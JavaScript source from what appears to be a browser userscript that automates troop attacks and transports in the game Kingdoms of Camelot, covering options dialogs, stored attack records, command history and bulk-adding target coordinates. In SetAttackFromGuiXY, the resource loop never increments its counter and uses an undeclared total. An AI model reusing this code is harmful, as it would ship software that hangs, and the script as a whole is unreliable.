			"<input id='KOCAttackEnableLogging' type='checkbox' "+(this.options.enableLogging?'checked':'')+" /> Enable diagnostic logging in the Firefox error console messages window (useful if trying to debug a problem or if you are submitting details along with a bug report).<br />"+
			"</td></tr>"+
			"<tr><td valign='top' align='center'><img src='img/buildings/castle_lvl10.png' /></td><td valign='top'>"+
			"<input id='KOCAttackChangeCitySecs' value='"+(this.options.changeCitySecs)+"' size='3' /> seconds inbetween changing cities.<br />"+
			"Cycle thru all the cities <input id='KOCAttackCitiesDoneMax' value='"+(this.options.autoAttackCitiesDoneMax)+"' size='3' /> times and then wait "+
			"<input id='KOCAttackCitiesDelay' value='"+this.options.waitAfterCitiesDone+"' size='3' />secs before refreshing.<br />"+
			"Cities to attack from: "+okCitiesHtml+'<br />'+
			"<tr><td valign='top' align='center'></td><td valign='top'>"+
			"Import/Export: Paste or copy the settings here...<br /><textarea id='KOCAttackImport'></textarea>"+
			"<a class='button20' id='KOCAttackImportButton'><span>Import</span></a> <a class='button20' id='KOCAttackExportButton'><span>Export</span></a><br />"+
			"</td></tr>"+
			"</table>"+
			"<TABLE width=100%><TR><TD>"+
			"<a id='KOCAttackOptionsSave' class='button20'><span>Save</span></a> <a id='KOCAttackOptionsCancel' class='button20'><span>Cancel</span></a> <a id='KOCAttackOptionsReset' class='button20'><span>Reset options</span></a> <a id='KOCAttackOptionsResetAll' class='button20'><span>Reset all!</span></a>"+
			"<a id='KOCAttackDeleteAllStoredAttacks' class='button20'><span>Delete all stored attacks</span></a>"+
			"<a id='KOCAttackDeleteTransports' class='button20'><span>Delete transports</span></a>"+
			"</td><TD align=right>"+ KOCAversion +"</td></tr></form>";
		var t=this;
		var importText=t.ById('KOCAttackImport');
		importText.addEventListener('focus',function() {
			importText.select();
		},false);
		t.ById('KOCAttackImportButton').addEventListener('click',function() {
			if(importText.value=="") return;
			t.ImportAllFromJSON(importText.value);
		},false);
		t.ById('KOCAttackExportButton').addEventListener('click',function() {
			importText.value=t.ExportAllToJSON();
		},false);
		t.SetSelect(t.ById('KOCAttackOrder'),t.options.attackOrder);
		t.ById('KOCAttackOptionsCancel').addEventListener('click',function() {
			div.style.display='none';
		},false);
		t.ById('KOCAttackOptionsReset').addEventListener('click',function() {
			t.ClearOptions();
			t.options=t.GetOptions();
			div.style.display='none';
		},false);
		t.ById('KOCAttackOptionsResetAll').addEventListener('click',function() {
			t.FactoryReset();
			t.ReloadWindow();
		},false);
		t.ById('KOCAttackDeleteAllStoredAttacks').addEventListener('click',function() {
			t.DeleteAllStoredAttacks();
			t.ReloadWindow();
		},false);
		t.ById('KOCAttackDeleteTransports').addEventListener('click',function() {
 			t.DeleteTransports();
 			t.ReloadWindow();
 		},false);
// 		t.SetSelect(t.ById('KOCAttackAutoPublishPrivacy'),t.options.autoPublishPrivacySetting);
		for(var c=0; ++c<=8;) {
			var sp=t.ById('KOCAttackOkCities_'+c);
			var SetCity=function(target,set) {
				target.style.border=set?'2px solid #080':'';
				target.style.margin=set?'2px':'4px';
			};
			sp.addEventListener('click',function(evt) { SetCity(evt.target,evt.target.style.border==''?true:false); },false);
			SetCity(sp,t.options.okCities[c]);
		}
		t.ById('KOCAttackOptionsSave').addEventListener('click',function() {
			t.options.attackTypeCamp=t.ById('KOCAttackTypeCamp').checked;
			t.options.attackTypeCity=t.ById('KOCAttackTypeCity').checked;
			t.options.attackTypeWild=t.ById('KOCAttackTypeWild').checked;
			t.options.attackTypeTransport=t.ById('KOCAttackTypeTransport').checked;
			var attackpriority = t.ByName('KOCAttackPriority');
				if(attackpriority){
					for(var i =-1,j=attackpriority.length; ++i < j;) {
						if(attackpriority[i].checked) {
							t.options.attackpriority = attackpriority[i].value;
							break;
						}
					}
				}
			t.options.attackDelay=parseInt(t.ById('KOCAttackDelay').value);
			t.options.waitAfterCitiesDone=parseInt(t.ById('KOCAttackCitiesDelay').value);
			t.options.keepReports=parseInt(t.ById('KOCAttackKeepReports').value);
			t.options.changeCitySecs=parseInt(t.ById('KOCAttackChangeCitySecs').value);
			t.options.autoGoldHappiness=parseInt(t.ById('KOCAttackAutoGoldHappiness').value);
			t.options.percentOfPopToTrain=parseFloat(t.ById('KOCAttackPercentOfPopToTrain').value);
			t.options.percentToTrainOfMax=parseFloat(t.ById('KOCAttackPercentToTrainOfMax').value);
//			var prev_disableInviteFriends = t.options.disableInviteFriends;
//			t.options.disableInviteFriends=t.ById('KOCAttackDisableInviteFriends').checked;
//			t.options.disableDrawMapIcons=t.ById('KOCAttackDisableMapDraw').checked;
//			if(prev_disableInviteFriends != t.options.disableInviteFriends){
//				alert("You changed the option for disabling/enabling the \"Invite Friends\" feature.\nPlease note: You will need to refresh the entire game window for the new setting to take effect!");
//			}
//			t.options.autoHelpAlliance=t.ById('KOCAttackAutoHelpAlliance').checked;
//			t.options.hideAllianceHelpRequests=t.ById('KOCAttackHideAllianceHelpRequests').checked;
//			t.options.autoPublishGamePopups=t.ById('KOCAttackAutoPublishGamePopups').checked;
//			t.options.autoPublishPrivacySetting=t.ById('KOCAttackAutoPublishPrivacy').value;
			t.options.autoLogBackIn=t.ById('KOCAttackAutoLogBackIn').checked;
			t.options.enableLogging=t.ById('KOCAttackEnableLogging').checked;
			t.options.attackSecsSinceLastCamp=parseFloat(t.ById('KOCAttackHoursSinceLastCamp').value)*60*60;
			t.options.attackSecsSinceLastWild=parseFloat(t.ById('KOCAttackHoursSinceLastWild').value)*60*60;
			t.options.attackSecsSinceLastCity=parseFloat(t.ById('KOCAttackHoursSinceLastCity').value)*60*60;
			t.options.attackSecsSinceLastTransport=parseFloat(t.ById('KOCAttackMinsSinceLastTransport').value)*60;
			t.options.transportResourcesReserveAmount=parseInt(t.ById('KOCAttackTransportReserveAmount').value);
			t.options.randomPercent=parseFloat(t.ById('KOCAttackRandom').value);
			t.options.rallyKeep=parseInt(t.ById('KOCAttackRally').value);
			t.options.attackMaxDistance=parseFloat(t.ById('KOCAttackMaxDistance').value);
			t.options.autoAttackCitiesDoneMax=parseInt(t.ById('KOCAttackCitiesDoneMax').value);
			t.options.attackOrder=t.ById('KOCAttackOrder').value;
			t.options.lockAttackFromCity=t.ById('KOCAttackLockAttackFromCity').checked;
			t.options.knightreset=t.ById('KOCAttackUnselectKnight').checked;
			t.options.autoRemoveReports=t.ById('KOCAttackRemoveReports').checked;
			t.options.autoRemoveFarmReports=t.ById('KOCAttackRemoveFarmReports').checked;
			t.options.retryMarch=t.ById('KOCAttackRetryMarch').checked;
			t.options.impendingAttackUrl=t.ById('KOCAttackImpendingAttackUrl').value;
			t.options.impendingStopAttack=t.ById('KOCAttackImpendingStopAttack').checked;
			t.options.noViewReports=t.ById('KOCAttackNoViewReports').checked;
			for(var c=0; ++c<=8;) {
				var okcity=t.ById('KOCAttackOkCities_'+c);
				t.options.okCities[c]=okcity.style.border!=""?true:false;
			}
			t.SetOptions(t.options);
			div.style.display='none';
		},false);
	},
//------------------------------------------------------------------------------------------------------------
	AddOptionsLink:function() {
		var t=this;
		var a=t.ById('KOCAttackOptionsLink');
		if(a) return;
		a=this.AddTabLink('Options');
		if(!a) {
			window.setTimeout(function() {
				t.AddOptionsLink();
			},t.GetRandTime(250));
			return;
		}
		a.id='KOCAttackOptionsLink';
		a.addEventListener('click',function() {
			t.ShowOptionsDialog();
		},false);
	},
//------------------------------------------------------------------------------------------------------------
	AddViewAttacksLink:function() {
		var t=this;
		var a=t.ById('KOCAttackViewAttacksLink');
		if(a) return;
		a=this.AddTabLink('View Attacks');
		if(!a) {
			window.setTimeout(function() {
				t.AddViewAttacksLink();
			},t.GetRandTime(250));
			return;
		}
		a.id='KOCAttackViewAttacksLink';
		a.addEventListener('click',function() {
			t.ShowViewAttacksDialog();
		},false);
	},
//------------------------------------------------------------------------------------------------------------
	AddTabLink:function(html) {
		var tab_container = this.ById("main_engagement_tabs");
		tab_container.style.width = "715px";
		var a=document.createElement('a');
		a.className='navTab';
		a.innerHTML='<span>'+html+'</span>';
		var tabs=this.ById('KOCAttackTabs');
		if(!tabs) {
			var ptabs=this.ById('main_engagement_tabs');
			if(!ptabs) {
				ptabs=this.ById('topnav_msg');
				if(ptabs)ptabs=ptabs.parentNode;
			}
			if(!ptabs) {
				ptabs=document.body;
			}
			tabs=document.createElement('span');
			tabs.id='KOCAttackTabs';
			ptabs.insertBefore(tabs,ptabs.childNodes[0]);
		}
		if(tabs) {
			tabs.style.whiteSpace='nowrap';
			tabs.style.width='1600px';
			tabs.appendChild(a);
			return a;
		}
		return null;
	},
//------------------------------------------------------------------------------------------------------------
	ToggleAutoAttack:function() {
		var t=this;
		var a=t.GetAutoAttack();
		if(!a) {
			t.Log("Enabling Auto Attack");
			t.SetAutoAttack({'barbarian':true,'cities':{}});
			window.setTimeout(function() {
				t.SetAttackStatusMessage();
			},t.GetRandTime(250));
			t.RestartAutoAttack();
		} else {
			t.Log("Disabling Auto Attack");
			t.ClearAutoAttackTimeout();
			t.SetAutoAttack(null);
			window.setTimeout(function() {
				t.SetAttackStatusMessage();
			},t.GetRandTime(250));
		}
	},
//------------------------------------------------------------------------------------------------------------
	SetAttackStatusMessage:function() {
		var toggle=this.ById('KOCAttackToggle');
		if(!toggle) {
		    var t=this;
			toggle=this.AddTabLink('Auto Attack');
			if(!toggle) {
				window.setTimeout(function() {
					t.SetAttackStatusMessage();
				},t.GetRandTime(250));
				return;
			}
			toggle.id='KOCAttackToggle';
			toggle.addEventListener('click',function() {
				t.ToggleAutoAttack();
			},false);
		}
		var autoAttack=this.GetAutoAttack();
		if(autoAttack) {
			toggle.innerHTML='<span>Auto Attack - On</span>';
		} else {
			toggle.innerHTML='<span>Auto Attack - Off</span>';
		}
	},
//------------------------------------------------------------------------------------------------------------
	SetStatusMessage:function(str) {
		var mess=this.GetStatusMessage();
		var txt=this.ById('KOCAttackMessage');
		if(!txt) {
			txt=document.createElement('span');
			mess.appendChild(txt);
		}
		txt.innerHTML=str;
	},
//------------------------------------------------------------------------------------------------------------
	GetStatusMessage:function() {
		var mess=this.ById('KOCAttackStatus');
		if(!mess) {
			var timeHead=this.ById('kochead_time');
			mess=document.createElement('span');
			mess.id='KOCAttackStatus';
			timeHead.parentNode.appendChild(mess);
		}
		return mess;
	},
//------------------------------------------------------------------------------------------------------------
	Log:function(str) {
		if(!this.options || !this.options.enableLogging){
			return;
		}
		str=this.GetServerId()+":"+str;
		GM_log(str);
	},
//------------------------------------------------------------------------------------------------------------
	currentServerId:-1,
	GetServerId:function() {
		var m=/^[a-zA-Z]+([0-9]+)\./.exec(document.location.hostname);
		if(m) {
			this.currentServerId = m[1];
		}
		if(this.currentServerId<0){
			this.currentServerId = GM_getValue("KOCAttackLastKnownServerID",-1);
		}
		return this.currentServerId;
	},
//------------------------------------------------------------------------------------------------------------
	GetValue:function(prefix,def) {
		var n=prefix+'_'+this.GetServerId();
		return this.browser_getValue(n,def);
	},
//------------------------------------------------------------------------------------------------------------
	SetValue:function(prefix,val) {
		var n=prefix+'_'+this.GetServerId();
		this.browser_setValue(n,val);
	},
//------------------------------------------------------------------------------------------------------------
	GetValuesCache:function(doneFunc) {
		if(!this.isChrome) {
			if(doneFunc) {
				doneFunc.call(this);
			}
			return;
		}
		var idx=0;
		var cookie='kocattack';
		var doccookie=document.cookie;
		while(true) {
			var i=doccookie.indexOf(cookie+'=',idx);
			if(i<0) { this.valuesCache={}; return; }
			idx=i+cookie.length+1;
			var ch=doccookie.substring(i-1,i);
			if(i==0 || ch==';' || ch==' ' || ch=='=') {
				break;
			}
		}
		var idxEnd=doccookie.indexOf(";",idx);
		if(idxEnd<0) { idxEnd=doccookie.length; }
		var cookieVal=doccookie.substring(idx,idxEnd);
		this.valuesCache=JSON2.parse(unescape(cookieVal));
	},
//------------------------------------------------------------------------------------------------------------
	SetValuesCache:function() {
		if(!this.isChrome) return;
		document.cookie='kocattack='+escape(JSON2.stringify(this.valuesCache))+'; expires='+
			(new Date(new Date().getTime()+(60*60*24*365*5)).toGMTString() );
	},
//------------------------------------------------------------------------------------------------------------
	browser_listValues:function() {
		if(this.isChrome) {
			var ns=[];
			for(var n in this.valuesCache) {
				ns.push(n);
			}
			return ns;
		}
		return GM_listValues();
	},
//------------------------------------------------------------------------------------------------------------
	browser_getValue:function(n,def) {
		if(this.isChrome) {
			if(this.valuesCache==null) {
				this.GetValuesCache();
			}
			if(this.valuesCache[n]==undefined) {
				return def;
			}
			return this.valuesCache[n];
		}
		return GM_getValue(n,def);
	},
//------------------------------------------------------------------------------------------------------------
	browser_setValue:function(n,val) {
		if(this.isChrome) {
			this.valuesCache[n]=val;
			return;
		}
		if(val==null || val==undefined) {
			GM_deleteValue(n);
		} else {
			GM_setValue(n,val);
		}
	},
//------------------------------------------------------------------------------------------------------------
	GetMinHours:function() {
		var m=this.GetValue('MinHours',1);
		if(m=="" || m==undefined) m=1;
		return m;
	},
//------------------------------------------------------------------------------------------------------------
	SetMinHours:function(val) {
		this.SetValue('MinHours',val);
	},
//------------------------------------------------------------------------------------------------------------
	ClearOptions:function() {
		this.SetValue('Options',JSON.stringify({}));
	},
//------------------------------------------------------------------------------------------------------------
	GetOptions:function() {
		var json=this.GetValue('Options','{}');
		if(json=='') json='{}';
		var options=JSON2.parse(json);
		var defOptions={"attackDelay":30,
			"attackTypeCamp":true,
			"attackTypeWild":true,
			"attackTypeCity":true,
			"attackTypeTransport":false,
			"attackOrder":"closest",
			"attackpriority":"None",
			"autoRemoveReports":false,
			"rallyKeep":0,
//			"disableDrawMapIcons":true,
			"attackSecsSinceLastCity":0,
			"attackSecsSinceLastCamp":0,
			"attackSecsSinceLastWild":0,
			"attackSecsSinceLastTransport":0,
			"transportResourcesReserveAmount":1000000,
			"randomPercent":10,
			"keepReports":10,
			"attackMaxDistance":75,
			"lockAttackFromCity":true,
			"knightreset":true,
			"waitAfterCitiesDone":3,
			"autoAttackCitiesDoneMax":2,
			"changeCitySecs":3,
			"retryMarch":true,
			"noViewReports":true,
			"chromeKeepReports":2,
			"percentOfPopToTrain":75,
			"percentToTrainOfMax":95,
			"autoGoldHappiness":99,
//			"disableInviteFriends":false,
//			"autoHelpAlliance":false,
//			"hideAllianceHelpRequests":false,
//			"autoPublishGamePopups":false,
//			"autoPublishPrivacySetting":"80",
			"autoLogBackIn":true,
			"enableLogging":false,
			"okCities":[1,1,1,1,1,1,1,1,1,1],
			"impendingStopAttack":false,
			'impendingAttackUrl':''};
		for(var n in defOptions) {
			if(options[n]!=undefined) { continue; }
			options[n]=defOptions[n];
		}
		return options;
	},
//------------------------------------------------------------------------------------------------------------
	SetOptions:function(v) {
		this.SetValue('Options',JSON2.stringify(v));
	},
//------------------------------------------------------------------------------------------------------------
	ClearCrossIframeCommands:function() {
		this.SetValue('CrossIframeCommands',JSON.stringify({}));
	},
//------------------------------------------------------------------------------------------------------------
	GetCrossIframeCommands:function() {
		var json=this.GetValue('CrossIframeCommands','{}');
		if(json=='') json='{}';
		var commands=JSON2.parse(json);
		if(!commands.queue || commands.queue instanceof Array !== true){
			commands.queue = [];
		}
		return commands;
	},
//------------------------------------------------------------------------------------------------------------
	SetCrossIframeCommands:function(v) {
		this.SetValue('CrossIframeCommands',JSON2.stringify(v));
	},
//------------------------------------------------------------------------------------------------------------
	AddCrossIframeCommand:function(pageName, functionCall, functionParameters) {
		var command = {};
		command.pageName = pageName;
		command.functionCall = functionCall;
		var commands = this.GetCrossIframeCommands();
		commands.queue.push(command);
		this.SetCrossIframeCommands(commands);
	},
//------------------------------------------------------------------------------------------------------------
	GetAttackName:function(x,y) {
		return 'attack_'+this.GetServerId()+'_'+x+','+y;
	},
//------------------------------------------------------------------------------------------------------------
	SetAttack:function(x,y,attack) {
		this.browser_setValue(this.GetAttackName(x,y), JSON2.stringify(attack));
	},
//------------------------------------------------------------------------------------------------------------
	GetAttack:function(x,y) {
		var str=this.browser_getValue(this.GetAttackName(x,y),'');
		if(!str) return null;
		return JSON2.parse(str);
	},
//------------------------------------------------------------------------------------------------------------
	DeleteAttack:function(x,y) {
		var str=this.browser_getValue(this.GetAttackName(x,y),'');
		if(!str) return;
		GM_deleteValue(this.GetAttackName(x,y));
	},
//------------------------------------------------------------------------------------------------------------
	isSuicideAttackDefinedAtLocation:function(x,y) {
		var attack=this.GetAttack(x,y);
		if(!attack){ return false; }
		if(attack.suicidewave) { return true; }
		if(attack.a && attack.a.suicidewave){ return true; }
		return false;
	},
//------------------------------------------------------------------------------------------------------------
	IsFirstAttackAtLocation:function(x,y) {
		var attack=this.GetAttack(x,y);
		if(!attack){
			this.Log("Attack not defined in system. This is first attack!");
			return true;
		}
		if(attack.a) { attack = attack.a; }
		var current_marches=this.GetSeed().queue_atkp["city" + this.GetCurrentCityId()];
		for (var march in current_marches) {
				if(current_marches[march]['toXCoord'] == x && current_marches[march]['toYCoord'] == y){
				this.Log("Troops are already marching to ("+x+","+y+") in the troop activity.");
				if(attack.suicidewavetime && attack.suicidewave){
					var nowSecs=new Date().getTime()/1000;
					var elapsedTime=nowSecs-attack.suicidewavetime;
					if(elapsedTime > 30 && attack.time < attack.suicidewavetime){
						this.Log("Suicide wave attack was sent more than 30 seconds ago and normal wave has not been sent yet. Suicide wave should be re-sent! This is the first attack sent to ("+x+","+y+")!");
						return true;
					}
				}
				this.Log("This is not the first attack sent to ("+x+","+y+").");
				return false;
				break;
			}
		}
		this.Log("Troops are not currently marching to ("+x+","+y+") in the troop activity. This is the first attack.");
		return true;
	},
//------------------------------------------------------------------------------------------------------------
	GetCommandHistory:function(history_log_name) {
		if(!history_log_name){
			var history_log_name = "default";
		}
		var json=this.GetValue('PreviousCommandHistory_'+history_log_name,'{}');
		if(json=='') json='{}';
		var json_object=JSON2.parse(json);
		if(!json_object['items']){
			json_object['items'] = Array();
		}
		return json_object;
	},
//------------------------------------------------------------------------------------------------------------
	AddToCommandHistory:function(command_string, history_log_name, log_length_limit) {
		if(!command_string){ return false; }
		if(!history_log_name){ var history_log_name = "default"; }
		if(!log_length_limit){ var log_length_limit = 20; }
		var previous_commands = this.GetCommandHistory(history_log_name);
		var items = previous_commands['items'];
		items.push(command_string);
		if(items.length>log_length_limit){
			items = items.slice(items.length-log_length_limit);
		}
		previous_commands['items'] = items;
		this.SetValue('PreviousCommandHistory_'+history_log_name,JSON2.stringify(previous_commands));
	},
//------------------------------------------------------------------------------------------------------------
	FindInCommandHistory:function(command_string, history_log_name) {
		if(!command_string){ return false; }
		if(!history_log_name){ var history_log_name = "default"; }
		var previous_commands = this.GetCommandHistory(history_log_name);
		var items = previous_commands['items'];
		for(var i=-1,j=items.length; ++i<j;){
			if(items[i] == command_string){
				return true;
			}
		}
		return false;
},
//------------------------------------------------------------------------------------------------------------
GetGuiCoords:function() {
		var x=this.ById('modal_attack_target_coords_x');
		var y=this.ById('modal_attack_target_coords_y');
		if(!x || !y) {
			this.Log("Cannot find gui coords");
			return null;
		}
		if(x.value.length<1 || y.value.length<1){
			this.Log("One or both coordinates are missing!");
			return null;
		}
		return [x.value,y.value];
},
//------------------------------------------------------------------------------------------------------------
SetAttackFromGui:function(box, resetTime) {
		var xy=this.GetGuiCoords();
		if(!xy) return null;
		if(!resetTime){resetTime=false;}
		return this.SetAttackFromGuiXY(xy[0],xy[1],box, null, null, resetTime);
},
//------------------------------------------------------------------------------------------------------------
AttackLastSentTime:0,
UpdateAttackLastSentTime:function(){
		this.AttackLastSentTime = new Date().getTime()/1000;
		this.SetValue('AttackLastSentTime',parseInt(this.AttackLastSentTime));
},
//------------------------------------------------------------------------------------------------------------
SendingMultipleWaves:false,
IsCurrentlySendingMultipleWaves:function() {
		if(this.AttackLastSentTime == 0){
			this.AttackLastSentTime = this.GetValue('AttackLastSentTime',0);
		}
		var nowSecs = new Date().getTime()/1000;
		var waveTimerDelay = this.options.attackDelay*2;
		var timeDifference = nowSecs-this.AttackLastSentTime;
		if(timeDifference > waveTimerDelay && this.SendingMultipleWaves==true){
			this.SendingMultipleWaves=false;
			this.Log("Multiple wave timer \("+waveTimerDelay+"\ seconds) has expired. Last known attack was sent "+timeDifference+" seconds ago. Resetting timer and continuing...");
		}
		return this.SendingMultipleWaves;
},
//------------------------------------------------------------------------------------------------------------
SetAttackFromGuiXY:function(x,y,box,isSuicideWave,locationType,resetTime) {

		if(resetTime==true){
			this.Log("Resetting start times for attack ("+x+","+y+")");
		}
		if(!locationType){ var locationType = ""; }
		var locationTypeRadioBoxes = this.ByName('KOCAttackLocationType');
		if(locationTypeRadioBoxes){
			for(var i = -1,j=locationTypeRadioBoxes.length; ++i < j;) {
				if(locationTypeRadioBoxes[i].checked) {
					locationType = locationTypeRadioBoxes[i].value;
					break;
				}
			}
		}
			if(!isSuicideWave){
			var isSuicideWave = false;
			var bulkAddSuicideWaveCheckbox = this.ById("KOCAttackBulkAddSuicideWave");
			if(bulkAddSuicideWaveCheckbox){isSuicideWave = bulkAddSuicideWaveCheckbox.checked;}
			var otherIsSuicideWaveCheckbox = this.ById("KOCAttackSuicideWaveCheckbox");
			if(otherIsSuicideWaveCheckbox){	if(otherIsSuicideWaveCheckbox.checked){isSuicideWave=true;} }
		}
		var troops=[];
		var totalTroops=0;
		for(var tr=-1; ++tr<20;) {
			var troop=this.ById('modal_attack_unit_ipt'+tr);
			if(!troop) continue;
			try {
				var v=parseInt(troop.value);
				troops[tr]=v;
				totalTroops+=v;
			} catch(e) {
				continue;
			}
		}
		var comment=this.ById('KocAttackComment');
		var marchType = this.getAttackTypeSelected();
		if(marchType==null) {
			throw("Cannot find attack type");
		}
		if(totalTroops<=0) {
			this.Log("No troops, not saving attack");
			return null;
		}
		var nowSecs=new Date().getTime()/1000;
		var monthAgo=nowSecs-(60*60*24*31);
		if(marchType==0 && locationType!="Transport") {
			var attack=this.GetAttack(x,y);
			if(!attack) attack={};
			attack.type=marchType;
			if(comment){ attack.comment=comment.value; }
			var SuicideAttackDefined=this.isSuicideAttackDefinedAtLocation(x,y);
			var firstAttack=this.IsFirstAttackAtLocation(x,y);
			this.Log("First attack?: "+firstAttack);
			this.Log("Suicide attack defined? : "+SuicideAttackDefined);
			if(isSuicideWave) {
				this.Log("Suicide attack determined by checkbox");
				this.Log("Suicide wave :"+troops);
				attack.suicidewave=troops;
				attack.currenttattackwavetype = "suicide";
				attack.suicidewavetime = nowSecs;
				if(resetTime==true){ attack.suicidewavetime=monthAgo; }
				this.SendingMultipleWaves = true;
			} else {
				this.Log("Normal wave :"+troops);
				attack.time=nowSecs;
				if(resetTime==true){ attack.time=monthAgo; }
				if(!SuicideAttackDefined && firstAttack){
					attack.suicidewave=undefined;
				}
				attack.currenttattackwavetype = "normal";
				attack.troops=troops;
				this.SendingMultipleWaves = false;
			}
			attack.fromCity=this.GetCurrentCityId();
			if(!attack.levelInfo){attack.levelInfo={'type':locationType,'level':0};}
			if(locationType==""){
				if(attack.levelInfo.type!=""){
					locationType = attack.levelInfo.type;
				}else{
					locationType = "Camp";
				}
			}
			attack.levelInfo.type = locationType;
			this.prevAttack={'x':x,'y':y};
			this.SetAttack(x,y,attack);
			return attack;
		} else if(marchType==1 || locationType=="Transport") {
			var attack=this.GetAttack(x,y);
			if(!attack) attack={};
			attack.type=1;
			if(comment){
				attack.comment=comment.value;
			}
			var SuicideAttackDefined=this.isSuicideAttackDefinedAtLocation(x,y);
			attack.time=nowSecs;
			if(resetTime==true){ attack.time=monthAgo; }
			attack.troops=troops;
			var resources=[];
			var resourceTypes = Array(
				'gold',
				'rec1',
				'rec2',
				'rec3',
				'rec4'
			);
			for(var res=-1,j=resourceTypes.length; res<j;) {
				var resource=this.ById('modal_attack_'+resourceTypes[res]);
				if(!resource) continue;
				try {
					var v=parseInt(resource.value);
					resources[res]=v;
					totalResources+=v;
				} catch(e) {
					continue;
				}
			}
			attack.resources=resources;
			attack.fromCity=this.GetCurrentCityId();
			if(!attack.levelInfo){attack.levelInfo={'type':locationType,'level':0};}
			attack.currenttattackwavetype = "transport";
			this.prevAttack={'x':x,'y':y};
			this.SetAttack(x,y,attack);
			return attack;
		} else {
			this.prevAttack={'x':"350",'y':'350'};
		}
		return null;
	},
//------------------------------------------------------------------------------------------------------------
ToggleCurrenttAttackWaveType:function(x,y,manual_setting) {
		var original_attack = this.GetAttack(x,y);
		if(original_attack) {
			var attack = original_attack;
			if(original_attack.a){
				attack = original_attack.a;
			}
			var previousattackwavetype = 'undefined';
			if(attack){
				if(attack.currenttattackwavetype){
					previousattackwavetype = attack.currenttattackwavetype;
				}
				if(manual_setting){
					attack.currenttattackwavetype = manual_setting;
				}else if(attack.suicidewave && attack.currenttattackwavetype == "bulkadded"){
					attack.currenttattackwavetype = "suicide";
				}else{
					if(attack.suicidewave && attack.currenttattackwavetype == "normal"){
						attack.currenttattackwavetype = "suicide";
					}else{
						attack.currenttattackwavetype = "normal";
					}
				}
				this.Log("Toggling attack for ("+x+", "+y+") from "+previousattackwavetype+" to "+attack.currenttattackwavetype);
				if(original_attack.a){
					original_attack.a = attack;
					attack = original_attack;
				}
				this.SetAttack(x,y,attack);
				return attack.currenttattackwavetype;
			}else{
				return false;
			}
		}else{
			return false;
		}
},
//------------------------------------------------------------------------------------------------------------
BulkAddCoords:function(box,coordsText,force,locationType,isSuicideWave) {
		if(!locationType){
			var locationType = "Camp"; //Default to camp
		}
		if(!isSuicideWave){
			var isSuicideWave = false;
		}
		var coordRows=coordsText.split("\n");
		var added=0;
		for(var r=-1,j=coordRows.length; ++r<j;) {
			var row=coordRows[r];
			var m=/^\s*([0-9]+)\s*,\s*([0-9]+)/.exec(row);
			if(!m) {
				m=/^\s*([0-9]+)\s+([0-9]+)/.exec(row);
				if(!m) continue;
			}
			var x=m[1];
			var y=m[2];
			var attack=this.GetAttack(x,y);
			var currenttattackwavetype = "bulkadded";
			if(locationType=="Transport"){
				currenttattackwavetype = "transport";
			}
			var SuicideAttackDefined=this.isSuicideAttackDefinedAtLocation(x,y);
			var previous_suicidewave = undefined;
			if(attack && (SuicideAttackDefined || isSuicideWave)){
				previous_suicidewave = attack.suicidewave;
			}
			if(attack && !force) {
				if(SuicideAttackDefined && isSuicideWave==true){
					this.Log('Suicide wave for '+x+','+y+' has already been added. Try over-writing it.');
					continue;
				}else if(attack.troops){
					this.Log('Attack wave for '+x+','+y+' has already been added. Try over-writing it.');
					continue;
				}
			}
			var attack=this.SetAttackFromGuiXY(x,y,box,isSuicideWave,locationType);
			if(attack) {
				attack.levelInfo={'type':locationType,'level':0};
				attack.fromCity=this.GetCurrentCityId();
				var nowSecs=new Date().getTime()/1000;
				var monthAgo=nowSecs-(60*60*24*31);
				attack.time=monthAgo;
				if(SuicideAttackDefined || isSuicideWave || previous_suicidewave){
					attack.suicidewavetime = attack.time - this.options.attackDelay;
					if(previous_suicidewave && (!SuicideAttackDefined || !isSuicideWave)){
						this.Log("Previous suicide wave for this attack was over-written by new attack. Merging and restoring...");
						attack.suicidewave = previous_suicidewave;
					}
				}
				attack.ignore=undefined;
				attack.currenttattackwavetype=currenttattackwavetype;
				this.SetAttack(x,y,attack);
				this.Log(x+','+y+' attack added: '+this.inspect(attack));
				this.Log("current attack wave type: "+attack.currenttattackwavetype);
				added++;
			}
		}
		this.DrawClosestFarms();
		return added;
},
//------------------------------------------------------------------------------------------------------------
BulkAddAttackLink:function(box) {
		var div=this.ById('BulkAddAttackDiv');
		var t=this;
		if(!div) {
			div=document.createElement('div');
			div.id='BulkAddAttackDiv';
			div.style.display='inline';
		}
		div.innerHTML='';
		var bulkAddTable=document.createElement('table');
		bulkAddTable.style.background='transparent';
		var bulkAddDiv=document.createElement('div');
		bulkAddTable.insertRow(-1).insertCell(-1).appendChild(bulkAddDiv);
		bulkAddDiv.style.display='none';
		t.AddHtml(bulkAddDiv,"Copy and paste coords here (ie. 343,434) one on each line...<br />Note: it will only add the target using the current number of troops on this screen.<br /><input id='KOCAttackBulkAddForce' type='checkbox' /> <label for=\"KOCAttackBulkAddForce\">Overwrite existing attack if one already exists</label><br />");
		t.AddHtml(bulkAddDiv,"<hr />");
		t.AddHtml(bulkAddDiv,"Type of Locations (All coordinates must match this type):<br />");
		var arrData = [["Camp", "Camps"],["City", "City"],["Transport", "Transport"],["Wilderness", "Wildernesses"]];
		for (var i=-1,j=arrData.length; ++i < j;){
			var objRadItem = document.createElement("input");
			objRadItem.type = "radio";
			objRadItem.name = "KOCAttackBulkAddLocationType";
			objRadItem.id = "KOCAttackBulkAddLocationType_" + arrData[i][0];
			objRadItem.value = arrData[i][0];
			if(i == 0) {objRadItem.defaultChecked = true; objRadItem.checked = true; };
			var objTextNode = document.createTextNode(" " + arrData[i][1]);
			var objLabel = document.createElement("label");
			objLabel.htmlFor = objRadItem.id;
			objLabel.appendChild(objRadItem);
			objLabel.appendChild(objTextNode);
			bulkAddDiv.appendChild(objLabel);
			objRadItem.addEventListener('change',function() {
				var locationType = "Camp";
				var bulkLocationTypeRadioBoxes = t.ByName('KOCAttackBulkAddLocationType');
				if(bulkLocationTypeRadioBoxes){
					for(var i = -1,j=bulkLocationTypeRadioBoxes.length; ++i < j;) {
						if(bulkLocationTypeRadioBoxes[i].checked) {
							locationType = bulkLocationTypeRadioBoxes[i].value;
							break;
						}
					}
				}
				var locationTypeRadioBoxes = t.ByName('KOCAttackLocationType');
				if(locationTypeRadioBoxes){
					for(var i = -1,j=locationTypeRadioBoxes.length; ++i < j;) {
						if(locationTypeRadioBoxes[i].value == locationType) {
							locationTypeRadioBoxes[i].checked = true;
							break;
						}
					}
				}
			},false);
			t.AddHtml(bulkAddDiv," ");
		};
		t.AddHtml(bulkAddDiv,"<hr />");
		var bulkAddSuicideSpan=document.createElement('span');
		var bulkAddSuicideCheckbox=document.createElement('input');
		bulkAddSuicideCheckbox.id = "KOCAttackBulkAddSuicideWave";
